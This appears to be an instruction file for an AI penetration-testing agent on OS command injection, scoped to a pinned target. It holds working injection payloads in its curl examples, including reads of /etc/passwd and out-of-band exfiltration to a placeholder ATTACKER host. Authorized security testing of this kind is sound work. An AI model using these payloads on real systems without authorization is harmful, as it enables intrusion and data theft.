---
name: command-injection
description: OS command injection playbook — find user-controlled input reaching a shell (ping, traceroute, nslookup, convert, ffmpeg, archive, DNS lookup fields, filename params), confirm blind or visible with time/side-channel, then extract data and escalate to RCE or persistent access. Use when an endpoint takes hostnames/IPs/filenames/URLs that are likely passed to a shell or subprocess.
allowed-tools:
  - http
  - shell
  - read_payloads
  - file_write
---

# OS command injection playbook

Goal: prove shell command execution with valid input syntax against the pinned target only. Work from least to most destructive; never leave a persistent backdoor.

## 1. Map where input hits a shell

Typical sinks: `ping`, `traceroute`, `nslookup/dig`, `curl` wrappers, image tools (`convert`, `ffmpeg`), archive tools (`tar`, `zip`, `7z`), email fields, DNS lookup forms, `nmap`-style UIs. The response usually echoes the command output or takes seconds to return.

## 2. Confirm with low-risk operators

```sh
# visible injection — command output appears in the response
curl -ksS "https://TARGET/ping?host=8.8.8.8;id"
curl -ksS "https://TARGET/ping?host=8.8.8.8%26%26id"
curl -ksS "https://TARGET/dns?domain=example.com%60id%60"
curl -ksS "https://TARGET/ping?host=$(echo inject)&x=1"

# blind — side channel: response time
curl -ksS "https://TARGET/ping?host=8.8.8.8;sleep%203"
# blind — out-of-band: DNS/HTTP callback to a box you control
curl -ksS "https://TARGET/ping?host=8.8.8.8;curl%20http://ATTACKER/pf-$RANDOM"
```

Distinguish which separator works: `;`, `&&`, `|`, `||`, `\n` (%0a), backticks, `$(...)`.

## 3. Extract data (blind: via callback or time)

```sh
# visible
curl -ksS "https://TARGET/ping?host=8.8.8.8;cat%20/etc/passwd|head%20-5"
# blind OOB data exfil — encode so the request doesn't break
curl -ksS "https://TARGET/ping?host=8.8.8.8;curl%20http://ATTACKER/$(whoami|base64)"
```

If the injection is inside a quoted argument, break out: `" ; id ; "` or escape quotes. If it's inside a pipe-separated token, chain after `|`.

## 4. Escalate (authorized labs only)

- Find the user: `;id` → if `www-data`/`nobody`, note the limited blast radius; if root, that is a critical finding.
- Standard RCE checklist: `;id;whoami;uname -a;w;cat /etc/passwd|head -3`.
- Reverse shell / bind shell only in an environment where you hold the other end and the test explicitly permits it — otherwise stop at command-execution proof.

## 5. Reporting

Evidence: request + payload and the echoed output (or the callback you received / timed delta). Impact: full RCE in the webapp's user context, data exfiltration, pivot potential. Remediation: never built commands from user input; use safe APIs/libraries with argument arrays, strict allowlists, and least-privilege service accounts.

When you can reproduce command output as evidence, call `confirm_finding`.